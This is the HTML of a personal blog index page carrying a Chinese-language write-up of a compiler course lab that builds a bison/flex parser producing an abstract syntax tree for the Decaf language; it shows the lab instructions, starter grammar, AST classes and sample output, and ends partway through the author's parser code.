<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/4/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/4/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/27/CMPT379%E7%BC%96%E8%AF%91%E5%99%A8Lab2%EF%BC%9Adecafast/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/27/CMPT379%E7%BC%96%E8%AF%91%E5%99%A8Lab2%EF%BC%9Adecafast/" class="post-title-link" itemprop="url">CMPT379编译器Lab2：decafast</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-06-27 00:40:09 / Modified: 00:43:38" itemprop="dateCreated datePublished" datetime="2023-06-27T00:40:09+08:00">2023-06-27</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>44k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>40 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>decafast</strong></p>
<p>本作业的目标是为 Decaf 编程语言编写一个语法分析器</p>
<p>Decaf 中词汇元素的详细信息在 Decaf 规范中：<a target="_blank" rel="noopener" href="http://anoopsarkar.github.io/compilers-class/decafspec.html">Decaf Programming Language Specification</a> </p>
<p>为 Decaf 语言提供解析器，以生成摘要有效 Decaf 程序的语法树</p>
<ul>
<li>抽象语法树（AST）是程序结构，无需在源代码中包含所有详细信息，它可以被认为是一个抽象的表示</li>
<li>想要生成的抽象语法树，可以使用 <a target="_blank" rel="noopener" href="http://www.oilshell.org/blog/2016/12/11.html">Zehpyr</a> 定义语言（这是一种用于序列化抽象语法树的方法）</li>
</ul>
<p><strong>实验描述</strong></p>
<p>使用 Decaf 规范作为指导，完成一个 Decaf 语言的语法分析器</p>
<p>请务必遵守以下要求：</p>
<ul>
<li>如果程序成功解析输入，则应使用 <code>exit(EXIT_SUCCESS)</code> 退出程序</li>
<li>如果您的程序在输入的无咖啡因程序中发现错误，则应使用 <code>exit(EXIT_FAILURE)</code> 退出</li>
<li>程序生成的抽象语法树必须采用上面指定的格式，输出规范在 <code>/compilers-class-hw/decafast/Decaf.asdl</code> 中提供</li>
<li>不要在输出中添加空格，这可能会导致将输出与参考输出匹配时出现问题</li>
</ul>
<p>使用 Python 程序在测试用例上运行 <code>zipout.py</code> 解决方案程序，您的解决方案必须在目录 <code>answer</code> 中编译，并且必须调用 <code>decaflex</code>，针对所有测试用例运行，如下所示：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 zipout.py</span><br></pre></td></tr></table></figure>
<ul>
<li>这将创建一个名为 <code>output</code> 的目录和一个可以根据参考输出文件进行检查的文件 <code>output.zip</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 check.py </span><br></pre></td></tr></table></figure>
<ul>
<li>这将检查您解决方案的准确性</li>
</ul>
<p><strong>实验步骤</strong></p>
<p>您需要使用在 HW1 中构建的词法分析器，因此需要将 <code>decaflex</code> 中的词法分析器 <code>decaflex.lex</code> 复制到 <code>/compilers-class-hw/decafast/answer</code> 中</p>
<p>目录 <code>/compilers-class-hw/decafast/answer</code> 中存在这个作业的一个不完整的解决方案，本实验要求构造该方案的副本，因此要执行下列命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp default.cc decafast.cc</span><br><span class="line">cp default.lex decafast.lex</span><br><span class="line">cp default.y decafast.y</span><br></pre></td></tr></table></figure>
<ul>
<li><code>decafast.cc</code>：修改 <code>#include &quot;default.tab.h&quot;</code> 以替换为 <code>#include &quot;decafast.tab.h&quot;</code></li>
<li><code>decafast.y</code>：修改 <code>#include &quot;default.cc&quot;</code> 以替换为 <code>#include &quot;decafast.cc&quot;</code></li>
<li><code>decafast.lex</code>：仅将令牌模式定义从 HW1 中的 <code>decaflex.lex</code> 复制到 <code>decafast.lex</code>，不要从 <code>main</code> 复制任何内容，因为 <code>decafast.y</code> 中有一个新的 <code>main</code> 函数</li>
<li>PS：T_PACKAGE，T_LCB，T_RCB，T_ID 这4个 token 需使用 <code>default.lex</code> 中的默认值，忽略 T_WHITESPACE</li>
</ul>
<p>通过运行以下命令构建可执行文件 <code>decafast</code>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make decafast</span><br></pre></td></tr></table></figure>
<p>该实验提供了一个未完成案例 <code>default.y</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;default-defs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yylex</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">char</span> *)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// print AST?</span></span><br><span class="line"><span class="keyword">bool</span> printAST = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;decafast.cc&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%define parse.error verbose</span><br><span class="line"></span><br><span class="line">%<span class="class"><span class="keyword">union</span>&#123;</span> <span class="comment">// 该样例程序只提供了两个可选类型:树节点,字符串</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">decafAST</span> *<span class="title">ast</span>;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> *sval;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">%token T_PACKAGE</span><br><span class="line">%token T_LCB</span><br><span class="line">%token T_RCB</span><br><span class="line">%token &lt;sval&gt; T_ID</span><br><span class="line"></span><br><span class="line">%type &lt;ast&gt; extern_list decafpackage</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">start: program</span><br><span class="line"></span><br><span class="line">program: extern_list decafpackage</span><br><span class="line">    &#123; </span><br><span class="line">        ProgramAST *prog = <span class="keyword">new</span> ProgramAST((decafStmtList *)$<span class="number">1</span>, (PackageAST *)$<span class="number">2</span>); </span><br><span class="line">		<span class="keyword">if</span> (printAST) &#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; getString(prog) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">delete</span> prog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">extern_list: <span class="comment">/* extern_list can be empty */</span></span><br><span class="line">    &#123; decafStmtList *slist = <span class="keyword">new</span> decafStmtList(); $$ = slist; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">decafpackage: T_PACKAGE T_ID T_LCB T_RCB</span><br><span class="line">    &#123; $$ = <span class="keyword">new</span> PackageAST(*$<span class="number">2</span>, <span class="keyword">new</span> decafStmtList(), <span class="keyword">new</span> decafStmtList()); <span class="keyword">delete</span> $<span class="number">2</span>; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// parse the input and create the abstract syntax tree</span></span><br><span class="line">  <span class="keyword">int</span> retval = yyparse();</span><br><span class="line">  <span class="keyword">return</span>(retval &gt;= <span class="number">1</span> ? EXIT_FAILURE : EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 <code>decafast.cc</code> 中提供了3个节点的类结构：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAST</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">virtual</span> ~<span class="built_in">decafAST</span>() &#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafStmtList</span> :</span> <span class="keyword">public</span> decafAST &#123; <span class="comment">/* 管理decaf语句 */</span></span><br><span class="line">	list&lt;decafAST *&gt; stmts;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafStmtList</span>() &#123;&#125;</span><br><span class="line">	~<span class="built_in">decafStmtList</span>() &#123;</span><br><span class="line">		<span class="keyword">for</span> (list&lt;decafAST *&gt;::iterator i = stmts.<span class="built_in">begin</span>(); i != stmts.<span class="built_in">end</span>(); i++) &#123; </span><br><span class="line">			<span class="keyword">delete</span> *i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> stmts.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafAST *e)</span> </span>&#123; stmts.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafAST *e)</span> </span>&#123; stmts.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> commaList&lt;class decafAST *&gt;(stmts); &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PackageAST</span> :</span> <span class="keyword">public</span> decafAST &#123; <span class="comment">/* 管理decaf类 */</span></span><br><span class="line">	string Name;</span><br><span class="line">	decafStmtList *FieldDeclList;</span><br><span class="line">	decafStmtList *MethodDeclList;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">PackageAST</span>(string name, decafStmtList *fieldlist, decafStmtList *methodlist) </span><br><span class="line">		: <span class="built_in">Name</span>(name), <span class="built_in">FieldDeclList</span>(fieldlist), <span class="built_in">MethodDeclList</span>(methodlist) &#123;&#125;</span><br><span class="line">	~<span class="built_in">PackageAST</span>() &#123; </span><br><span class="line">		<span class="keyword">if</span> (FieldDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> FieldDeclList; &#125;</span><br><span class="line">		<span class="keyword">if</span> (MethodDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> MethodDeclList; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;Package&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(FieldDeclList) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(MethodDeclList) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProgramAST</span> :</span> <span class="keyword">public</span> decafAST &#123; <span class="comment">/* 管理decaf程序 */</span></span><br><span class="line">	decafStmtList *ExternList;</span><br><span class="line">	PackageAST *PackageDef;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">ProgramAST</span>(decafStmtList *externs, PackageAST *c) : <span class="built_in">ExternList</span>(externs), <span class="built_in">PackageDef</span>(c) &#123;&#125;</span><br><span class="line">	~<span class="built_in">ProgramAST</span>() &#123; </span><br><span class="line">		<span class="keyword">if</span> (ExternList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> ExternList; &#125; </span><br><span class="line">		<span class="keyword">if</span> (PackageDef != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> PackageDef; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;Program&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(ExternList) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(PackageDef) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>在分析的过程中需要为每一个可能得节点设置对应的类</li>
</ul>
<p>最开始尝试的时候比较迷茫，不知道从何入手，于是先看一个程序提供的案例来进行分析：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> func <span class="title">print_int</span><span class="params">(<span class="keyword">int</span>)</span> <span class="keyword">void</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> func <span class="title">read_int</span><span class="params">()</span> <span class="keyword">int</span></span>;</span><br><span class="line"></span><br><span class="line">package Catalan &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">func <span class="title">main</span><span class="params">()</span> <span class="keyword">void</span> </span>&#123;</span><br><span class="line">       print_int( cat( read_int() ) );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// factorial of n</span></span><br><span class="line">    <span class="function">func <span class="title">fact</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="keyword">int</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (n == <span class="number">1</span>) &#123; <span class="keyword">return</span>(<span class="number">1</span>); &#125;</span><br><span class="line">       <span class="keyword">else</span> &#123; <span class="keyword">return</span>(n*fact(n<span class="number">-1</span>)); &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// a choose b</span></span><br><span class="line">    <span class="function">func <span class="title">choose</span><span class="params">(a <span class="keyword">int</span>, b <span class="keyword">int</span>)</span> <span class="keyword">int</span> </span>&#123; </span><br><span class="line">       <span class="keyword">return</span>( fact(a) / (fact(b)*fact(a-b)) ); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// catalan number of n</span></span><br><span class="line">    <span class="function">func <span class="title">cat</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="keyword">int</span> </span>&#123; </span><br><span class="line">       <span class="keyword">return</span>( choose(<span class="number">2</span>*n,n)/(n+<span class="number">1</span>) ); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Program(ExternFunction(print_int,VoidType,VarDef(IntType)),ExternFunction(read_int,IntType,None),Package(Catalan,None,Method(main,VoidType,None,MethodBlock(None,MethodCall(print_int,MethodCall(cat,MethodCall(read_int,None))))),Method(fact,IntType,VarDef(n,IntType),MethodBlock(None,IfStmt(BinaryExpr(Eq,VariableExpr(n),NumberExpr(<span class="number">1</span>)),Block(None,ReturnStmt(NumberExpr(<span class="number">1</span>))),Block(None,ReturnStmt(BinaryExpr(Mult,VariableExpr(n),MethodCall(fact,BinaryExpr(Minus,VariableExpr(n),NumberExpr(<span class="number">1</span>))))))))),Method(choose,IntType,VarDef(a,IntType),VarDef(b,IntType),MethodBlock(None,ReturnStmt(BinaryExpr(Div,MethodCall(fact,VariableExpr(a)),BinaryExpr(Mult,MethodCall(fact,VariableExpr(b)),MethodCall(fact,BinaryExpr(Minus,VariableExpr(a),VariableExpr(b)))))))),Method(cat,IntType,VarDef(n,IntType),MethodBlock(None,ReturnStmt(BinaryExpr(Div,MethodCall(choose,BinaryExpr(Mult,NumberExpr(<span class="number">2</span>),VariableExpr(n)),VariableExpr(n)),BinaryExpr(Plus,VariableExpr(n),NumberExpr(<span class="number">1</span>))))))))</span><br></pre></td></tr></table></figure>
<ul>
<li>在 Program 中并列了3个节点：ExternFunction，ExternFunction，Package</li>
<li>在每个节点中又详细描述了它的基础信息</li>
</ul>
<p>模仿上述结构，可以写一个初版分析器：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span 